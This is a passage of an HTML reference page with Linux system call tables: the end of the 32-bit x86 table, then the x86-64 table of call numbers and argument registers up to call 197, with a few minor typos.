long</td><td>size_t</td><td>-</td><td>-</td><td>-</td></tr><tr><td>152</td><td>sys_mlockall</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>153</td><td>sys_munlockall</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>154</td><td>sys_sched_setparam</td><td>pid_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>155</td><td>sys_sched_getparam</td><td>pid_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>156</td><td>sys_sched_setscheduler</td><td>pid_t</td><td>-</td><td>-</td><td></td><td></td></tr><tr><td>157</td><td>sys_sched_getscheduler</td><td>pid_t</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>158</td><td>sys_sched_yield</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>159</td><td>sys_sched_get_priority_max</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>160</td><td>sys_sched_get_priority_min</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>161</td><td>sys_sched_rr_get_interval</td><td>pid_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>162</td><td>sys_nanosleep</td><td>struct  timespec *</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>163</td><td>sys_mremap</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>-</td></tr><tr><td>164</td><td>sys_setresuid</td><td>uid_t</td><td>-</td><td>-</td><td></td><td></td></tr><tr><td>165</td><td>sys_getresuid</td><td>uid_t  *</td><td>-</td><td>-</td><td></td><td></td></tr><tr><td>166</td><td>sys_vm86</td><td>struct  vm86_struct *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>167</td><td>sys_query_module</td><td>const char *</td><td>int</td><td>char *</td><td>size_t</td><td></td></tr><tr><td>168</td><td>sys_poll</td><td>struct  pollfd *</td><td>unsigned int</td><td>long</td><td>-</td><td>-</td></tr><tr><td>169</td><td>sys_nfsservctl</td><td>int</td><td>void *</td><td>void *</td><td>-</td><td>-</td></tr><tr><td>170</td><td>sys_setresgid</td><td>gid_t</td><td>-</td><td>-</td><td></td><td></td></tr><tr><td>171</td><td>sys_getresgid</td><td>gid_t  *</td><td>-</td><td>-</td><td></td><td></td></tr><tr><td>172</td><td>sys_prctl</td><td>int</td><td>unsigned long</td><td>unsigned long</td><td>unsigned  long</td><td>unsigned long</td></tr><tr><td>173</td><td>sys_rt_sigreturn</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>174</td><td>sys_rt_sigaction</td><td>int</td><td>const  struct sigaction *</td><td>-</td><td></td><td></td></tr><tr><td>175</td><td>sys_rt_sigprocmask</td><td>int</td><td>sigset_t  *</td><td>-</td><td></td><td></td></tr><tr><td>176</td><td>sys_rt_sigpending</td><td>sigset_t  *</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>177</td><td>sys_rt_sigtimedwait</td><td>const  sigset_t *</td><td>-</td><td></td><td></td><td></td></tr><tr><td>178</td><td>sys_rt_sigqueueinfo</td><td>int</td><td>int</td><td>siginfo_t  *</td><td>-</td><td>-</td></tr><tr><td>179</td><td>sys_rt_sigsuspend</td><td>sigset_t  *</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>180</td><td>sys_pread</td><td>unsigned int</td><td>char *</td><td>size_t</td><td>-</td><td></td></tr><tr><td>181</td><td>sys_pwrite</td><td>unsigned int</td><td>const char *</td><td>size_t</td><td>-</td><td></td></tr><tr><td>182</td><td>sys_chown</td><td>const char *</td><td>uid_t</td><td>-</td><td>-</td><td></td></tr><tr><td>183</td><td>sys_getcwd</td><td>char *</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>184</td><td>sys_capget</td><td>cap_user_header_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>185</td><td>sys_capset</td><td>cap_user_header_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>186</td><td>sys_sigaltstack</td><td>const  stack_t *</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>187</td><td>sys_sendfile</td><td>int</td><td>int</td><td>off_t  *</td><td>-</td><td></td></tr><tr><td>190</td><td>sys_vfork</td><td>struct  pt_regs</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table><h1 id="Linux-System-Call-Table-for-x86-64"><a href="#Linux-System-Call-Table-for-x86-64" class="headerlink" title="Linux System Call Table for x86 64"></a>Linux System Call Table for x86 64</h1><table><thead><tr><th>RAX</th><th>System call</th><th>RDI</th><th>RSI</th><th>RDX</th><th>R10</th><th>R8</th><th>R9</th></tr></thead><tbody><tr><td>0</td><td>sys_read</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>1</td><td>sys_write</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>2</td><td>sys_open</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>3</td><td>sys_close</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>4</td><td>sys_stat</td><td>const char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>5</td><td>sys_fstat</td><td>unsigned int fd</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>6</td><td>sys_lstat</td><td>fconst char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>7</td><td>sys_poll</td><td>struct poll_fd *ufds</td><td>unsigned int nfds</td><td>long timeout_msecs</td><td></td><td></td><td></td></tr><tr><td>8</td><td>sys_lseek</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td></td><td></td><td></td></tr><tr><td>9</td><td>sys_mmap</td><td>unsigned long addr</td><td>unsigned long len</td><td>unsigned long prot</td><td>unsigned long flags</td><td>unsigned long fd</td><td>unsigned long off</td></tr><tr><td>10</td><td>sys_mprotect</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td></td><td></td><td></td></tr><tr><td>11</td><td>sys_munmap</td><td>unsigned long addr</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>12</td><td>sys_brk</td><td>unsigned long brk</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>13</td><td>sys_rt_sigaction</td><td>int sig</td><td>const struct sigaction *act</td><td>struct sigaction *oact</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>14</td><td>sys_rt_sigprocmask</td><td>int how</td><td>sigset_t *nset</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>15</td><td>sys_rt_sigreturn</td><td>unsigned long __unused</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>16</td><td>sys_ioctl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>17</td><td>sys_pread64</td><td>unsigned long fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>18</td><td>sys_pwrite64</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>19</td><td>sys_readv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>20</td><td>sys_writev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>21</td><td>sys_access</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>22</td><td>sys_pipe</td><td>int *filedes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>23</td><td>sys_select</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set*exp</td><td>struct timeval *tvp</td><td></td></tr><tr><td>24</td><td>sys_sched_yield</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>25</td><td>sys_mremap</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td></td></tr><tr><td>26</td><td>sys_msync</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>27</td><td>sys_mincore</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char *vec</td><td></td><td></td><td></td></tr><tr><td>28</td><td>sys_madvise</td><td>unsigned long start</td><td>size_t len_in</td><td>int behavior</td><td></td><td></td><td></td></tr><tr><td>29</td><td>sys_shmget</td><td>key_t key</td><td>size_t size</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>30</td><td>sys_shmat</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>31</td><td>sys_shmctl</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>32</td><td>sys_dup</td><td>unsigned int fildes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>33</td><td>sys_dup2</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td></td><td></td><td></td><td></td></tr><tr><td>34</td><td>sys_pause</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>35</td><td>sys_nanosleep</td><td>struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td><td></td><td></td></tr><tr><td>36</td><td>sys_getitimer</td><td>int which</td><td>struct itimerval *value</td><td></td><td></td><td></td><td></td></tr><tr><td>37</td><td>sys_alarm</td><td>unsigned int seconds</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>38</td><td>sys_setitimer</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td></td><td></td><td></td></tr><tr><td>39</td><td>sys_getpid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>40</td><td>sys_sendfile</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td></td><td></td></tr><tr><td>41</td><td>sys_socket</td><td>int family</td><td>int type</td><td>int protocol</td><td></td><td></td><td></td></tr><tr><td>42</td><td>sys_connect</td><td>int fd</td><td>struct sockaddr *uservaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>43</td><td>sys_accept</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td></td><td></td><td></td></tr><tr><td>44</td><td>sys_sendto</td><td>int fd</td><td>void *buff</td><td>size_t len</td><td>unsigned flags</td><td>struct sockaddr *addr</td><td>int addr_len</td></tr><tr><td>45</td><td>sys_recvfrom</td><td>int fd</td><td>void *ubuf</td><td>size_t size</td><td>unsigned flags</td><td>struct sockaddr *addr</td><td>int *addr_len</td></tr><tr><td>46</td><td>sys_sendmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned flags</td><td></td><td></td><td></td></tr><tr><td>47</td><td>sys_recvmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>48</td><td>sys_shutdown</td><td>int fd</td><td>int how</td><td></td><td></td><td></td><td></td></tr><tr><td>49</td><td>sys_bind</td><td>int fd</td><td>struct sokaddr *umyaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>50</td><td>sys_listen</td><td>int fd</td><td>int backlog</td><td></td><td></td><td></td><td></td></tr><tr><td>51</td><td>sys_getsockname</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>52</td><td>sys_getpeername</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>53</td><td>sys_socketpair</td><td>int family</td><td>int type</td><td>int protocol</td><td>int *usockvec</td><td></td><td></td></tr><tr><td>54</td><td>sys_setsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td></td></tr><tr><td>55</td><td>sys_getsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td></td></tr><tr><td>56</td><td>sys_clone</td><td>unsigned long clone_flags</td><td>unsigned long newsp</td><td>void *parent_tid</td><td>void *child_tid</td><td>unsigned int tid</td><td></td></tr><tr><td>57</td><td>sys_fork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>58</td><td>sys_vfork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>59</td><td>sys_execve</td><td>const char *filename</td><td>const char *const argv[]</td><td>const char *const envp[]</td><td></td><td></td><td></td></tr><tr><td>60</td><td>sys_exit</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>61</td><td>sys_wait4</td><td>pid_t upid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td></td><td></td></tr><tr><td>62</td><td>sys_kill</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td><td></td></tr><tr><td>63</td><td>sys_uname</td><td>struct old_utsname *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>64</td><td>sys_semget</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td></td><td></td><td></td></tr><tr><td>65</td><td>sys_semop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td></td><td></td><td></td></tr><tr><td>66</td><td>sys_semctl</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>union semun arg</td><td></td><td></td></tr><tr><td>67</td><td>sys_shmdt</td><td>char *shmaddr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>68</td><td>sys_msgget</td><td>key_t key</td><td>int msgflg</td><td></td><td></td><td></td><td></td></tr><tr><td>69</td><td>sys_msgsnd</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td></td><td></td></tr><tr><td>70</td><td>sys_msgrcv</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td></td></tr><tr><td>71</td><td>sys_msgctl</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>72</td><td>sys_fcntl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>73</td><td>sys_flock</td><td>unsigned int fd</td><td>unsigned int cmd</td><td></td><td></td><td></td><td></td></tr><tr><td>74</td><td>sys_fsync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>75</td><td>sys_fdatasync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>76</td><td>sys_truncate</td><td>const char *path</td><td>long length</td><td></td><td></td><td></td><td></td></tr><tr><td>77</td><td>sys_ftruncate</td><td>unsigned int fd</td><td>unsigned long length</td><td></td><td></td><td></td><td></td></tr><tr><td>78</td><td>sys_getdents</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>79</td><td>sys_getcwd</td><td>char *buf</td><td>unsigned long size</td><td></td><td></td><td></td><td></td></tr><tr><td>80</td><td>sys_chdir</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>81</td><td>sys_fchdir</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>82</td><td>sys_rename</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>83</td><td>sys_mkdir</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>84</td><td>sys_rmdir</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>85</td><td>sys_creat</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>86</td><td>sys_link</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>87</td><td>sys_unlink</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>88</td><td>sys_symlink</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>89</td><td>sys_readlink</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td><td></td></tr><tr><td>90</td><td>sys_chmod</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>91</td><td>sys_fchmod</td><td>unsigned int fd</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>92</td><td>sys_chown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>93</td><td>sys_fchown</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>94</td><td>sys_lchown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>95</td><td>sys_umask</td><td>int mask</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>96</td><td>sys_gettimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>97</td><td>sys_getrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>98</td><td>sys_getrusage</td><td>int who</td><td>struct rusage *ru</td><td></td><td></td><td></td><td></td></tr><tr><td>99</td><td>sys_sysinfo</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>100</td><td>sys_times</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>101</td><td>sys_ptrace</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td></td><td></td></tr><tr><td>102</td><td>sys_getuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>103</td><td>sys_syslog</td><td>int type</td><td>char *buf</td><td>int len</td><td></td><td></td><td></td></tr><tr><td>104</td><td>sys_getgid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>105</td><td>sys_setuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>106</td><td>sys_setgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>107</td><td>sys_geteuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>108</td><td>sys_getegid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>109</td><td>sys_setpgid</td><td>pid_t pid</td><td>pid_t pgid</td><td></td><td></td><td></td><td></td></tr><tr><td>110</td><td>sys_getppid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>111</td><td>sys_getpgrp</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>112</td><td>sys_setsid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>113</td><td>sys_setreuid</td><td>uid_t ruid</td><td>uid_t euid</td><td></td><td></td><td></td><td></td></tr><tr><td>114</td><td>sys_setregid</td><td>gid_t rgid</td><td>gid_t egid</td><td></td><td></td><td></td><td></td></tr><tr><td>115</td><td>sys_getgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>116</td><td>sys_setgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>117</td><td>sys_setresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>118</td><td>sys_getresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>119</td><td>sys_setresgid</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td></td><td></td><td></td></tr><tr><td>120</td><td>sys_getresgid</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td></td><td></td><td></td></tr><tr><td>121</td><td>sys_getpgid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>122</td><td>sys_setfsuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>123</td><td>sys_setfsgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>124</td><td>sys_getsid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>125</td><td>sys_capget</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td></td><td></td><td></td><td></td></tr><tr><td>126</td><td>sys_capset</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td></td><td></td><td></td><td></td></tr><tr><td>127</td><td>sys_rt_sigpending</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>128</td><td>sys_rt_sigtimedwait</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct timespec *uts</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>129</td><td>sys_rt_sigqueueinfo</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td><td></td></tr><tr><td>130</td><td>sys_rt_sigsuspend</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>131</td><td>sys_sigaltstack</td><td>const stack_t *uss</td><td>stack_t *uoss</td><td></td><td></td><td></td><td></td></tr><tr><td>132</td><td>sys_utime</td><td>char *filename</td><td>struct utimbuf *times</td><td></td><td></td><td></td><td></td></tr><tr><td>133</td><td>sys_mknod</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td></td><td></td><td></td></tr><tr><td>134</td><td>sys_uselib</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>135</td><td>sys_personality</td><td>unsigned int personality</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>136</td><td>sys_ustat</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td></td><td></td><td></td><td></td></tr><tr><td>137</td><td>sys_statfs</td><td>const char *pathname</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>138</td><td>sys_fstatfs</td><td>unsigned int fd</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>139</td><td>sys_sysfs</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td></td><td></td><td></td></tr><tr><td>140</td><td>sys_getpriority</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>141</td><td>sys_setpriority</td><td>int which</td><td>int who</td><td>int niceval</td><td></td><td></td><td></td></tr><tr><td>142</td><td>sys_sched_setparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>143</td><td>sys_sched_getparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>144</td><td>sys_sched_setscheduler</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td></td><td></td><td></td></tr><tr><td>145</td><td>sys_sched_getscheduler</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>146</td><td>sys_sched_get_priority_max</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>147</td><td>sys_sched_get_priority_min</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>148</td><td>sys_sched_rr_get_interval</td><td>pid_t pid</td><td>struct timespec *interval</td><td></td><td></td><td></td><td></td></tr><tr><td>149</td><td>sys_mlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>150</td><td>sys_munlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>151</td><td>sys_mlockall</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>152</td><td>sys_munlockall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>153</td><td>sys_vhangup</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>154</td><td>sys_modify_ldt</td><td>int func</td><td>void *ptr</td><td>unsigned long bytecount</td><td></td><td></td><td></td></tr><tr><td>155</td><td>sys_pivot_root</td><td>const char *new_root</td><td>const char *put_old</td><td></td><td></td><td></td><td></td></tr><tr><td>156</td><td>sys__sysctl</td><td>struct __sysctl_args *args</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>157</td><td>sys_prctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td></td><td>unsigned long arg5</td></tr><tr><td>158</td><td>sys_arch_prctl</td><td>struct task_struct *task</td><td>int code</td><td>unsigned long *addr</td><td></td><td></td><td></td></tr><tr><td>159</td><td>sys_adjtimex</td><td>struct timex *txc_p</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>160</td><td>sys_setrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>161</td><td>sys_chroot</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>162</td><td>sys_sync</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>163</td><td>sys_acct</td><td>const char *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>164</td><td>sys_settimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>165</td><td>sys_mount</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td></td></tr><tr><td>166</td><td>sys_umount2</td><td>const char *target</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>167</td><td>sys_swapon</td><td>const char *specialfile</td><td>int swap_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>168</td><td>sys_swapoff</td><td>const char *specialfile</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>169</td><td>sys_reboot</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td></td><td></td></tr><tr><td>170</td><td>sys_sethostname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>171</td><td>sys_setdomainname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>172</td><td>sys_iopl</td><td>unsigned int level</td><td>struct pt_regs *regs</td><td></td><td></td><td></td><td></td></tr><tr><td>173</td><td>sys_ioperm</td><td>unsigned long from</td><td>unsigned long num</td><td>int turn_on</td><td></td><td></td><td></td></tr><tr><td>174</td><td>sys_create_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>175</td><td>sys_init_module</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td></td><td></td><td></td></tr><tr><td>176</td><td>sys_delete_module</td><td>const chat *name_user</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>177</td><td>sys_get_kernel_syms</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>178</td><td>sys_query_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>179</td><td>sys_quotactl</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td></td><td></td></tr><tr><td>180</td><td>sys_nfsservctl</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>181</td><td>sys_getpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>182</td><td>sys_putpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>183</td><td>sys_afs_syscall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>184</td><td>sys_tuxcall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>185</td><td>sys_security</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>186</td><td>sys_gettid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>187</td><td>sys_readahead</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>188</td><td>sys_setxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>189</td><td>sys_lsetxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>190</td><td>sys_fsetxattr</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>191</td><td>sys_getxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>192</td><td>sys_lgetxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>193</td><td>sys_fgetxattr</td><td>int fd</td><td>const har *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>194</td><td>sys_listxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>195</td><td>sys_llistxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>196</td><td>sys_flistxattr</td><td>int fd</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>197</td><td>sys_removexattr</td><td>const char 